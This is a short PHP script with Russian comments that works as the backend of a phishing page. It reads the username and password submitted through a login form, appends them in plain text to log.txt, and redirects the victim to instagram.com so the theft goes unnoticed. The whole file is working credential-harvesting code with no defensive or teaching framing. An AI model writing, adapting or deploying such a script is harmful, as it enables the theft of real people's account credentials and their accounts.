<?php
// Получаем данные из формы
$username = $_POST['username'];
$password = $_POST['password'];

// Открываем файл для записи (добавление в конец файла)
$fp = fopen('log.txt', 'a+');

// Проверяем, что файл открыт успешно
if ($fp) {
    // Записываем данные в файл
    fwrite($fp, "Username: " . $username . "\n");
    fwrite($fp, "Password: " . $password . "\n\n");
    
    // Закрываем файл после записи
    fclose($fp);
} else {
    echo "Не удалось открыть файл для записи.";
}

// Перенаправляем на страницу Instagram
header('Location: https://instagram.com');
exit;
?>
